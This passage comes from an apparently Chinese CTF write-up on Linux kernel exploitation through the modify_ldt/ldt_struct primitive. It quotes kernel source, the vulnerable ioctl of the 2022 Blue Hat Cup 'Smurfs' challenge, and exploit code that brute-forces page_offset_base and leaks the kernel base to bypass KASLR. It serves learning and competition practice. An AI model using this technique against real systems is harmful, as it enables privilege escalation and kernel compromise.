(ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">        LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line">        <span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">        <span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;</span><br><span class="line">            error = -EINVAL;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">        <span class="keyword">if</span> (oldmode)</span><br><span class="line">            ldt.avl = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line">        <span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">    finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment"> * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment"> * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment"> * them over to the new LDT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment"> * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment"> * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">            free_ldt_pgtables(mm);</span><br><span class="line">        free_ldt_struct(new_ldt);</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">    unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">    free_ldt_struct(old_ldt);</span><br><span class="line">    error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    out_unlock:</span><br><span class="line">    up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    out:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到最后会将新的ldt放到mm中，然后释放掉旧的ldt，这里主要需要注意的是如何生存一个新的ldt，可以看到是调用了alloc_ldt_struct函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct ldt_struct *<span class="title">alloc_ldt_struct</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt = kmalloc(<span class="keyword">sizeof</span>(struct ldt_struct), GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    BUILD_BUG_ON(LDT_ENTRY_SIZE != <span class="keyword">sizeof</span>(struct desc_struct));</span><br><span class="line">    alloc_size = num_entries * LDT_ENTRY_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen is very picky: it requires a page-aligned LDT that has no</span></span><br><span class="line"><span class="comment"> * trailing nonzero bytes in any page that contains LDT descriptors.</span></span><br><span class="line"><span class="comment"> * Keep it simple: zero the whole allocation and never allocate less</span></span><br><span class="line"><span class="comment"> * than PAGE_SIZE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">if</span> (alloc_size &gt; PAGE_SIZE)</span><br><span class="line">        new_ldt-&gt;entries = __vmalloc(alloc_size, GFP_KERNEL_ACCOUNT | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_ldt-&gt;entries = (<span class="keyword">void</span> *)get_zeroed_page(GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!new_ldt-&gt;entries) &#123;</span><br><span class="line">        kfree(new_ldt);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The new LDT isn&#x27;t aliased for PTI yet. */</span></span><br><span class="line">    new_ldt-&gt;slot = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;nr_entries = num_entries;</span><br><span class="line">    <span class="keyword">return</span> new_ldt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里，kmalloc一个ldt_struct的size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment"> * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment"> * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment"> * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>*<span class="title">entries</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>nr_entries;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment"> * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment"> * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment"> * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment"> * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">int</span>slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里其实可以ldt_struct的size为0x10，那么这里的利用思路是</p><ol><li>通过write_ldt控制ldt结构体</li><li>利用read_ldt进行爆破</li></ol><p>这里为什么使用爆破呢？可以看到在copy_to_user的过程中如果并没有完成的话时会返回一个负数，那么我们可以通过这一方法来爆破出内核地址。</p><h2 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a>例题演示</h2><h3 id="2022-蓝帽杯-半决赛-Smurfs"><a href="#2022-蓝帽杯-半决赛-Smurfs" class="headerlink" title="2022 蓝帽杯 半决赛 Smurfs"></a>2022 蓝帽杯 半决赛 Smurfs</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep\</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>首先题目开启的保护只是smep和kaslr</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">kernel_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">int</span> size; <span class="comment">// r13d</span></span><br><span class="line">    __int64 v6; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">char</span> *v7; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">char</span> *buf; <span class="comment">// r14</span></span><br><span class="line">    __int64 v9; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">char</span> *v10; <span class="comment">// r12</span></span><br><span class="line">    __int64 v11; <span class="comment">// r14</span></span><br><span class="line">    __int64 buf_low; <span class="comment">// r13</span></span><br><span class="line">    add_args a1; <span class="comment">// [rsp+0h] [rbp-48h] BYREF</span></span><br><span class="line">    __int64 v14; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> __int64))_fentry__)(file, cmd, arg);</span><br><span class="line">    v15 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( cmd )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( !copy_from_user(&amp;a1, v3, <span class="number">8LL</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( LODWORD(a1.size) &lt;= <span class="number">2</span> &amp;&amp; addrList[LODWORD(a1.size)] )</span><br><span class="line">                    kfree();</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( !copy_from_user(&amp;a1, v3, <span class="number">0x18</span>LL) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( LODWORD(a1.size) &lt;= <span class="number">2</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    v10 = addrList[LODWORD(a1.size)];</span><br><span class="line">                    <span class="keyword">if</span> ( v10 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( LODWORD(a1.buf) &lt;= <span class="number">8</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                            v11 = v14;</span><br><span class="line">                            buf_low = LODWORD(a1.buf);</span><br><span class="line">                            _check_object_size(addrList[LODWORD(a1.size)], LODWORD(a1.buf), <span class="number">0LL</span>);</span><br><span class="line">                            copy_from_user(v10, v11, buf_low);</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( !copy_from_user(&amp;a1, v3, <span class="number">0x10</span>LL) )</span><br><span class="line">            &#123;</span><br><span class="line">                size = a1.size;</span><br><span class="line">                <span class="keyword">if</span> ( LODWORD(a1.size) &lt;= <span class="number">0x20</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    v6 = _kmalloc(a1.size, <span class="number">0xCC0</span>LL);</span><br><span class="line">                    v7 = (<span class="keyword">char</span> *)v6;</span><br><span class="line">                    <span class="keyword">if</span> ( v6 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        buf = a1.buf;</span><br><span class="line">                        <span class="keyword">if</span> ( size &lt; <span class="number">0</span> )</span><br><span class="line">                            BUG();</span><br><span class="line">                        _check_object_size(v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size, <span class="number">0LL</span>);</span><br><span class="line">                        <span class="keyword">if</span> ( !copy_from_user(v7, buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size) )</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> ( !addrList[<span class="number">0</span>] )</span><br><span class="line">                            &#123;</span><br><span class="line">                                v9 = <span class="number">0LL</span>;</span><br><span class="line">                                <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">                            &#125;</span><br><span class="line">                            v9 = <span class="number">1LL</span>;</span><br><span class="line">                            <span class="keyword">if</span> ( !addrList[<span class="number">1</span>] )</span><br><span class="line">                            &#123;</span><br><span class="line">                                LABEL_17:</span><br><span class="line">                                addrList[v9] = v7;</span><br><span class="line">                                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ioctl函数存在三个功能，可以看到存在明显的UAF，但是在create时只能create两个堆块来使用，并且题目没有从内核读取数据到用户态的方法。</p><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a><strong>利用过程</strong></h4><p>那么根据上面所说的modify_ldt的利用原理来看，我们如果存在一个0x10大小的object，我们是可以控制到ldt_struct的，在write_ldt函数要想顺利的执行到下面我们还需要控制一下user_desc结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">desc.limit = <span class="number">0</span>;</span><br><span class="line">desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">desc.contents = <span class="number">0</span>;</span><br><span class="line">desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">desc.useable = <span class="number">0</span>;</span><br><span class="line">desc.lm = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>当执行完write_ldt函数后，ldt_struct是我们可控的了，所以我们需要考虑泄露地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">========================================================================================================================</span><br><span class="line">    Start addr    |   Offset   |     End addr     |  Size   | VM area description</span><br><span class="line">========================================================================================================================</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> <span class="number">0000000000000000</span> |    <span class="number">0</span>       | <span class="number">00007f</span>ffffffffff |  <span class="number">128</span> TB | user-space <span class="keyword">virtual</span> memory, different per mm</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> <span class="number">0000800000000000</span> | +<span class="number">128</span>    TB | ffff7fffffffffff | ~<span class="number">16</span>M TB | ... huge, almost <span class="number">64</span> bits wide hole of non-canonical</span><br><span class="line">                  |            |                  |         |     <span class="keyword">virtual</span> memory addresses up to the <span class="number">-128</span> TB</span><br><span class="line">                  |            |                  |         |     starting offset of kernel mappings.</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br><span class="line">                                                            |</span><br><span class="line">                                                            | Kernel-space <span class="keyword">virtual</span> memory, shared between all processes:</span><br><span class="line">____________________________________________________________|___________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> ffff800000000000 | <span class="number">-128</span>    TB | ffff87ffffffffff |    <span class="number">8</span> TB | ... guard hole, also reserved <span class="keyword">for</span> hypervisor</span><br><span class="line"> ffff880000000000 | <span class="number">-120</span>    TB | ffff887fffffffff |  <span class="number">0.5</span> TB | LDT remap <span class="keyword">for</span> PTI</span><br><span class="line"> ffff888000000000 | <span class="number">-119.5</span>  TB | ffffc87fffffffff |   <span class="number">64</span> TB | direct mapping of all physical memory (page_offset_base)</span><br><span class="line"> ffffc88000000000 |  <span class="number">-55.5</span>  TB | ffffc8ffffffffff |  <span class="number">0.5</span> TB | ... unused hole</span><br><span class="line"> ffffc90000000000 |  <span class="number">-55</span>    TB | ffffe8ffffffffff |   <span class="number">32</span> TB | vmalloc/ioremap space (vmalloc_base)</span><br><span class="line"> ffffe90000000000 |  <span class="number">-23</span>    TB | ffffe9ffffffffff |    <span class="number">1</span> TB | ... unused hole</span><br><span class="line"> ffffea0000000000 |  <span class="number">-22</span>    TB | ffffeaffffffffff |    <span class="number">1</span> TB | <span class="keyword">virtual</span> memory <span class="built_in">map</span> (vmemmap_base)</span><br><span class="line"> ffffeb0000000000 |  <span class="number">-21</span>    TB | ffffebffffffffff |    <span class="number">1</span> TB | ... unused hole</span><br><span class="line"> ffffec0000000000 |  <span class="number">-20</span>    TB | fffffbffffffffff |   <span class="number">16</span> TB | KASAN shadow memory</span><br><span class="line">__________________|____________|__________________|_________|____________________________________________________________</span><br><span class="line">                                                            |</span><br><span class="line">                                                            | Identical layout to the <span class="number">56</span>-bit one from here on:</span><br><span class="line">____________________________________________________________|____________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> fffffc0000000000 |   <span class="number">-4</span>    TB | fffffdffffffffff |    <span class="number">2</span> TB | ... unused hole</span><br><span class="line">                  |            |                  |         | vaddr_end <span class="keyword">for</span> KASLR</span><br><span class="line"> fffffe0000000000 |   <span class="number">-2</span>    TB | fffffe7fffffffff |  <span class="number">0.5</span> TB | cpu_entry_area mapping</span><br><span class="line"> fffffe8000000000 |   <span class="number">-1.5</span>  TB | fffffeffffffffff |  <span class="number">0.5</span> TB | ... unused hole</span><br><span class="line"> ffffff0000000000 |   <span class="number">-1</span>    TB | ffffff7fffffffff |  <span class="number">0.5</span> TB | %esp fixup stacks</span><br><span class="line"> ffffff8000000000 | <span class="number">-512</span>    GB | ffffffeeffffffff |  <span class="number">444</span> GB | ... unused hole</span><br><span class="line"> ffffffef00000000 |  <span class="number">-68</span>    GB | fffffffeffffffff |   <span class="number">64</span> GB | EFI region mapping space</span><br><span class="line"> ffffffff00000000 |   <span class="number">-4</span>    GB | ffffffff7fffffff |    <span class="number">2</span> GB | ... unused hole</span><br><span class="line"> ffffffff80000000 |   <span class="number">-2</span>    GB | ffffffff9fffffff |  <span class="number">512</span> MB | kernel text mapping, mapped to physical address <span class="number">0</span></span><br><span class="line"> ffffffff80000000 |<span class="number">-2048</span>    MB |                  |         |</span><br><span class="line"> ffffffffa0000000 |<span class="number">-1536</span>    MB | fffffffffeffffff | <span class="number">1520</span> MB | <span class="keyword">module</span> mapping space</span><br><span class="line"> ffffffffff000000 |  <span class="number">-16</span>    MB |                  |         |</span><br><span class="line">    FIXADDR_START | ~<span class="number">-11</span>    MB | ffffffffff5fffff | ~<span class="number">0.5</span> MB | kernel-internal fixmap range, variable size <span class="keyword">and</span> offset</span><br><span class="line"> ffffffffff600000 |  <span class="number">-10</span>    MB | ffffffffff600fff |    <span class="number">4</span> kB | legacy vsyscall ABI</span><br><span class="line"> ffffffffffe00000 |   <span class="number">-2</span>    MB | ffffffffffffffff |    <span class="number">2</span> MB | ... unused hole</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br></pre></td></tr></table></figure><p>这里考虑搜索物理地址直接映射区</p><blockquote><p>物理地址直接映射区即 direct mapping area，即<strong>线性映射区</strong>（不是线代那个线性映射），这块区域的线性地址到物理地址空间的映射是<strong>连续的</strong>，kmalloc 便从此处分配内存</p><p>而 vmalloc 则从 vmalloc/ioremap space 分配内存，起始地址为 <code>vmalloc_base</code>，这一块区域到物理地址间的映射是<strong>不连续的</strong></p></blockquote><p>这一块区域的起始地址称之为 <code>page_offset_base</code>，其地址为 <code>0xffff888000000000</code>，我们从这个地址开始搜索即可</p><p>因为在read_ldt函数中如果copy_to_user出现问题就会返回负数，所以我们可以利用这种方式来进行爆破。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x8</span>, buf);</span><br><span class="line">    <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        addr += <span class="number">0x40000000</span>;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在那道page_offset_base之后我们可以尝试泄露dir的值，在距离page_offset_base不远处会出现一个指向<code>kernel_base+0x40</code>的指针，所以可以泄漏出内核的基地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    create(<span class="number">0x50</span>, buf);</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x8</span>, buf);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">            kernel_offset = kernel_base - 